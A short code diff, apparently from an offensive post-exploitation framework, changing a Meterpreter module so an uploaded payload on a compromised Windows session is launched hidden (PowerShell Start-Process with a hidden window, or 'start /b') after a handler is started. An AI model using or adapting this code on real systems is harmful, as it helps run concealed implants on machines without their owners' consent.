@@ -5689,7 +5689,10 @@ class meterpreter(Module):
 				Open(meterpreter_handler_cmd, terminal=True)
 				logger.info("Starting handler...")
 				print(meterpreter_handler_cmd)
-				session.exec(f'start "" "{uploaded_path[0]}"', force_cmd=True, timeout=2) # TEMP fix with timeout
+				if session.subtype == 'psh':
+					session.exec(f'Start-Process -WindowStyle Hidden "{uploaded_path[0]}"')
+				else:
+					session.exec(f'start /b "" "{uploaded_path[0]}"')
 
 
 class cleanup(Module):
